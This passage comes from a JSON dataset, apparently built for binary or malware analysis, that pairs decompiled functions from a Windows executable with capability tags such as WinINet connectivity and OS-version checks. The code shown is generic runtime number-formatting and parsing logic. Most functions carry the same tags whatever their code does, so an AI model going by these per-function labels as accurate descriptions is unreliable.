        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ah\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040579f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t arg_10h_00;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    int16_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    char *pcVar13;\n    int32_t iVar14;\n    char *pcVar15;\n    uint uVar16;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0040536c(0x8c);\n    iVar14 = *(unaff_EBP + 0x18);\n    uVar7 = *(iVar14 + 0x14);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.00404575(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar14, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x0046e1ca;\n    }\n    fcn.0040327e(*(iVar14 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.00404a89(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x94) = piVar5;\n    fcn.004050a6();\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x60);\n    (*pcVar2)();\n    uVar16 = *(iVar14 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x84);\n    *(unaff_EBP + -99) = 0;\n    *(unaff_EBP + -0x62) = 0;\n    fcn.0040327e(uVar16);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.00403d87(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 1;\n    fcn.004050a6();\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x573000)(0x54e41c, 0x54e42b, unaff_EBP + -0x30);\n    (*pcVar2)();\n    uVar16 = *(unaff_EBP + -0x68);\n    cVar3 = fcn.0040640b(uVar16);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        if (iVar11 == *(unaff_EBP + -0x1a)) {\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004050a1();\n                iVar11 = *(arg_10h_00 + 6);\n            }\n            if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x0046dc3a;\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.004027a2();\n    }\n    else {\ncode_r0x0046dc3a:\n        puVar6 = *(unaff_EBP + -0x74);\n    }\n    piVar5 = *(unaff_EBP + -0x90);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x88) = puVar6;\n    pcVar13 = puVar6 + 1;\n    *(unaff_EBP + -0x74) = pcVar13;\n    iVar14 = *piVar5;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x98) = ((iVar14 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar15 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x78) = pcVar15;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar15 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x78) = pcVar15;\n    }\n    if ((*pcVar15 == '\\x7f') || (*pcVar15 < '\\x01')) {\n        cVar3 = fcn.0040640b(uVar16);\n        if (cVar3 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                uVar7 = fcn.004063a7(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                iVar14 = *(unaff_EBP + -0x7c);\n                if (*(unaff_EBP + -0x98) == iVar14 || *(unaff_EBP + -0x98) < iVar14) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar14 != 0)) {\n                    *pcVar13 = *(uVar7 + 0x54e41c);\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x7c) = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004027a2();\n                cVar3 = fcn.0040640b(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x74) = pcVar13;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x50) == 0) {\n            *(unaff_EBP + -0x80) = 0;\n        }\n        else {\n            uVar7 = fcn.00405691();\n            *(unaff_EBP + -0x80) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -0x38) = 0;\n        *(unaff_EBP + -0x34) = 0xf;\n        *(unaff_EBP + -0x48) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040654b(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar14 = 0;\n        cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n        if (cVar3 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x34);\n            pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x0046ddf1:\n            do {\n                pcVar12 = *(unaff_EBP + -0x78);\n                while( true ) {\n                    if ((iVar14 == 0) || (cVar3 = *pcVar12,  *(unaff_EBP + -0x69) = cVar3,  cVar3 == '\\x7f'))\n                    goto code_r0x0046de46;\n                    iVar14 = iVar14 + -1;\n                    if (iVar14 != 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) != pcVar12[iVar14]) goto code_r0x0046de42;\n                    }\n                    if (iVar14 == 0) {\n                        pcVar12 = unaff_EBP + -0x48;\n                        if (0xf < uVar7) {\n                            pcVar12 = pcVar15;\n                        }\n                        uVar7 = *(unaff_EBP + -0x34);\n                        if (*(unaff_EBP + -0x69) < *pcVar12) goto code_r0x0046de42;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x78) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x78) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004050a1();\n            }\n            uVar7 = fcn.004063a7(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n            if (uVar7 < 10) {\n                iVar8 = *(unaff_EBP + -0x7c);\n                *(unaff_EBP + -0x61) = 1;\n                if (*(unaff_EBP + -0x98) == iVar8 || *(unaff_EBP + -0x98) < iVar8) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        *(unaff_EBP + -0x62) = 1;\n                    }\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *pcVar13 = *(uVar7 + 0x54e41c);\n                    pcVar13 = pcVar13 + 1;\n                    *(unaff_EBP + -0x74) = pcVar13;\n                    *(unaff_EBP + -0x7c) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -0x48;\n                if (0xf < *(unaff_EBP + -0x34)) {\n                    iVar8 = *(unaff_EBP + -0x48);\n                }\n                if (*(iVar8 + iVar14) != '\\x7f') {\n                    iVar8 = unaff_EBP + -0x48;\n                    if (0xf < *(unaff_EBP + -0x34)) {\n                        iVar8 = *(unaff_EBP + -0x48);\n                    }\n                    *(iVar8 + iVar14) = *(iVar8 + iVar14) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x34);\n                pcVar15 = *(unaff_EBP + -0x48);\n                pcVar12 = unaff_EBP + -0x48;\n                if (0xf < uVar7) {\n                    pcVar12 = pcVar15;\n                }\n                if ((pcVar12[iVar14] == '\\0') || (*(unaff_EBP + -0x80) == 0)) goto code_r0x0046ddd4;\n                iVar11 = *(arg_10h_00 + 6);\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004050a1();\n                    iVar11 = *(arg_10h_00 + 6);\n                    uVar7 = *(unaff_EBP + -0x34);\n                    pcVar15 = *(unaff_EBP + -0x48);\n                }\n                if (iVar11 != *(unaff_EBP + -0x80)) goto code_r0x0046ddd4;\n                fcn.00404476(0);\n                iVar14 = iVar14 + 1;\n            }\n            fcn.004027a2();\n            cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n        } while (cVar3 == '\\0');\n        uVar7 = *(unaff_EBP + -0x34);\n        pcVar15 = *(unaff_EBP + -0x48);\ncode_r0x0046ddd4:\n        if (iVar14 == 0) goto code_r0x0046ddf1;\n        pcVar12 = unaff_EBP + -0x48;\n        if (0xf < uVar7) {\n            pcVar12 = pcVar15;\n        }\n        if ('\\0' < pcVar12[iVar14]) {\n            iVar14 = iVar14 + 1;\n            goto code_r0x0046ddf1;\n        }\ncode_r0x0046de42:\n        *(unaff_EBP + -99) = 1;\ncode_r0x0046de46:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x78) = pcVar15;\n            *(unaff_EBP + -0x80) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.00404070(unaff_EBP + -0x78, unaff_EBP + -0x80);\n                pcVar15 = *(unaff_EBP + -0x78);\n            }\n            fcn.00401a32(pcVar15);\n        }\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = fcn.0040640b(0x46de87);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        iVar4 = fcn.00403afd();\n        if (iVar11 == iVar4) {\n            puVar9 = fcn.00401366();\n            puVar6 = *(unaff_EBP + -0x74);\n            *puVar6 = **puVar9;\n            pcVar13 = puVar6 + 1;\n            *(unaff_EBP + -0x74) = pcVar13;\n            fcn.004027a2();\n        }\n        else {\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n    }\n    if ((**(unaff_EBP + -0x90) != 1000000000) && (*(unaff_EBP + -0x7c) == 0)) {\n        cVar3 = fcn.0040640b(uVar16);\n        if (cVar3 == '\\0') {\n            iVar14 = *(unaff_EBP + -0x70);\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) break;\n                *(unaff_EBP + -0x61) = 1;\n                iVar14 = iVar14 + -1;\n                fcn.004027a2();\n                cVar3 = fcn.0040640b(uVar16);\n            } while (cVar3 == '\\0');\n            *(unaff_EBP + -0x70) = iVar14;\n            pcVar13 = *(unaff_EBP + -0x74);\n        }\n        iVar14 = *(unaff_EBP + -0x70);\n        if (iVar14 < 0) {\n            *pcVar13 = '0';\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x70) = iVar14 + 1;\n        }\n    }\n    while (cVar3 = fcn.0040640b(uVar16),  cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.004050a1();\n        }\n        uVar7 = fcn.004063a7(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n        if (9 < uVar7) break;\n        iVar14 = *(unaff_EBP + -0x7c);\n        if (iVar14 < *(unaff_EBP + -0x98)) {\n            *pcVar13 = *(uVar7 + 0x54e41c);\n            pcVar13 = pcVar13 + 1;\n            *(unaff_EBP + -0x7c) = iVar14 + 1;\n        }\n        else if (uVar7 != 0) {\n            *(unaff_EBP + -0x62) = 1;\n        }\n        *(unaff_EBP + -0x61) = 1;\n        fcn.004027a2();\n    }\n    pcVar15 = pcVar13;\n    if (*(unaff_EBP + -0x62) != '\\0') {\n        while (pcVar15 = pcVar15 + -1,  pcVar15 != *(unaff_EBP + -0x88)) {\n            *(unaff_EBP + -0x90) = pcVar15;\n            ppcVar10 = fcn.00401366();\n            cVar3 = *pcVar15;\n            if (cVar3 != **ppcVar10) {\n                if (cVar3 != '9') {\n                    pcVar12 = *(unaff_EBP + -0x90);\n                    *pcVar15 = cVar3 + '\\x01';\n                    pcVar15 = pcVar12;\n                    if (pcVar12 != *(unaff_EBP + -0x88)) goto code_r0x0046e062;\n                    break;\n                }\n                *pcVar15 = '0';\n            }\n        }\n        *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n        *pcVar15 = '1';\ncode_r0x0046e062:\n        uVar16 = *(unaff_EBP + -0x68);\n    }\n    cVar3 = *(unaff_EBP + -0x61);\n    pcVar15 = pcVar13;\n    if (cVar3 != '\\0') {\n        cVar3 = fcn.0040640b(uVar16);\n        if (cVar3 == '\\0') {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.004050a1();\n            }\n            iVar11 = *(arg_10h_00 + 6);\n            if (iVar11 != *(unaff_EBP + -0x16)) {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004050a1();\n                    iVar11 = *(arg_10h_00 + 6);\n                }\n                if (iVar11 != *(unaff_EBP + -0x18)) goto code_r0x0046e1a9;\n            }\n            *pcVar13 = 'e';\n            pcVar15 = pcVar13 + 1;\n            fcn.004027a2();\n            *(unaff_EBP + -0x61) = 0;\n            iVar14 = 0;\n            cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                iVar11 = *(arg_10h_00 + 6);\n                if (iVar11 == *(unaff_EBP + -0x1a)) {\n                    *pcVar15 = '+';\n                }\n                else {\n                    if (*(arg_10h_00 + 4) == '\\0') {\n                        fcn.004050a1();\n                        iVar11 = *(arg_10h_00 + 6);\n                    }\n                    if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x0046e10d;\n                    *pcVar15 = '-';\n                }\n                pcVar15 = pcVar13 + 2;\n                fcn.004027a2();\n            }\ncode_r0x0046e10d:\n            cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n            if (cVar3 == '\\0') {\n                do {\n                    cVar1 = *(arg_10h_00 + 4);\n                    cVar3 = *(unaff_EBP + -0x61);\n                    *(unaff_EBP + -0x61) = cVar3;\n                    if (cVar1 == '\\0') {\n                        fcn.004050a1();\n                        cVar3 = *(unaff_EBP + -0x61);\n                    }\n                    if (*(arg_10h_00 + 6) != *(unaff_EBP + -0x30)) {\n                        if (cVar3 == '\\0') goto code_r0x0046e15e;\n                        break;\n                    }\n                    *(unaff_EBP + -0x61) = 1;\n                    fcn.004027a2();\n                    cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                } while (cVar3 == '\\0');\n                *pcVar15 = '0';\n                pcVar15 = pcVar15 + 1;\n            }\ncode_r0x0046e15e:\n            do {\n                cVar3 = fcn.0040640b(*(unaff_EBP + -0x68));\n                if (cVar3 != '\\0') break;\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.004050a1();\n                }\n                uVar7 = fcn.004063a7(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                if (iVar14 < 8) {\n                    *pcVar15 = *(uVar7 + 0x54e41c);\n                    pcVar15 = pcVar15 + 1;\n                    iVar14 = iVar14 + 1;\n                }\n                *(unaff_EBP + -0x61) = 1;\n                fcn.004027a2();\n            } while( true );\n        }\ncode_r0x0046e1a9:\n        cVar3 = *(unaff_EBP + -0x61);\n    }\n    if ((*(unaff_EBP + -99) != '\\0') || (cVar3 == '\\0')) {\n        pcVar15 = *(unaff_EBP + -0x84);\n    }\n    *pcVar15 = '\\0';\n    fcn.004029b9();\ncode_r0x0046e1ca:\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 5609
    },
    "004057c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057c2(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar1 = *(arg_ch + 0x3c);\n    }\n    else {\n        uVar1 = *(arg_ch + 0x38);\n    }\n    uVar1 = fcn.00404da4(uVar1);\n    *(in_ECX + 0x10) = uVar1;\n    uVar1 = 0x54e57c;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar1 = *(arg_ch + 0x48);\n    }\n    uVar1 = fcn.00404da4(uVar1);\n    *(in_ECX + 0x14) = uVar1;\n    uVar1 = 0x54e580;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar1 = *(arg_ch + 0x4c);\n    }\n    uVar1 = fcn.00404da4(uVar1);\n    *(in_ECX + 0x18) = uVar1;\n    *(in_ECX + 0xc) = **(arg_ch + 0x40);\n    *(in_ECX + 0xe) = **(arg_ch + 0x44);\n    return;\n}\n",
        "token_count": 326
    },
    "004057e5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004057e5(int32_t *arg_8h)\n\n{\n    int32_t *arg_ch;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    *(in_ECX + 3) = 0;\n    arg_ch = in_ECX + 1;\n    if (arg_8h == NULL) {\n        if (*0x57004c != 0) {\n            iVar2 = fcn.00404331();\n            *in_ECX = iVar2;\n            *arg_ch = *(iVar2 + 0x4c);\n            in_ECX[2] = *(iVar2 + 0x48);\n            fcn.004043d1(iVar2, arg_ch);\n            fcn.00406172(*in_ECX, in_ECX + 2);\n            uVar1 = *(*in_ECX + 0x350);\n            if ((uVar1 & 2) != 0) {\n                return;\n            }\n            *(*in_ECX + 0x350) = uVar1 | 2;\n            *(in_ECX + 3) = 1;\n            return;\n        }\n        *arg_ch = *0x56cf54;\n        iVar2 = *0x56cf58;\n    }\n    else {\n        *arg_ch = *arg_8h;\n        iVar2 = arg_8h[1];\n    }\n    in_ECX[2] = iVar2;\n    return;\n}\n",
        "token_count": 327
    },
    "00477d34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00477d34(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            float *arg_24h)\n\n{\n    uint32_t *puVar1;\n    float *pfVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_32ch;\n    uint *var_328h;\n    float fStack808;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pfVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.004055dd(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00477df2:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00401924(&var_31ch, &var_328h, arg_10h_00, &var_32ch);\n        fStack808 = fVar4;\n        *pfVar2 = fStack808;\n        if ((var_328h == &var_31ch) || (var_32ch != 0)) goto code_r0x00477df2;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00477dfe;\n        fVar4 = fcn.00401b5e(fStack808, var_320h << 2);\n    }\n    *pfVar2 = fVar4;\ncode_r0x00477dfe:\n    cVar3 = fcn.00401a9b(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.00403085(unaff_EBX);\n    return;\n}\n",
        "token_count": 569
    },
    "0040581c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040581c(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00403deb(&var_8h);\n    fcn.00403cba(0x5b);\n    arg_8h_00 = fcn.00403deb(&var_10h);\n    fcn.00402eb9(arg_8h_00);\n    fcn.00403cba(0x5d);\n    if (**0x56f458 == '@') {\n        *0x56f458 = *0x56f458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n        return arg_8h;\n    }\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 266
    },
    "0040582b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040582b(void)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    \n    piVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    if ((((piVar1 != NULL) && (*piVar1 == 0x5a4d)) && (piVar2 = *(piVar1 + 0x1e) + piVar1,  *piVar2 == 0x4550)) &&\n       (((piVar1 = 0x10b,  *(piVar2 + 6) == 0x10b && (0xe < piVar2[0x1d])) && (piVar2[0x3a] != 0)))) {\n        return 0x101;\n    }\n    return piVar1 & 0xffffff00;\n}\n",
        "token_count": 189
    },
    "00405858": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00405858(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.00402153();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a6a5c:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a6a5c;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.004039a4();\n                            *puVar4 = 0x16;\n                            fcn.00403751();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 458
    },
    "00405871": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405871(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.004048e5(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "004058bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004058bc(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            uVar2 = fcn.00403751();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.00405eed(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "0040590c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040590c(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            uVar2 = fcn.00403751();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.0040288d(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 345
    },
    "00405911": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405911(int32_t param_1)\n\n{\n    if (*(param_1 + 0x404) == 0) {\n        return 0x200;\n    }\n    return *(param_1 + 0x400) >> 1;\n}\n",
        "token_count": 63
    },
    "00405957": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
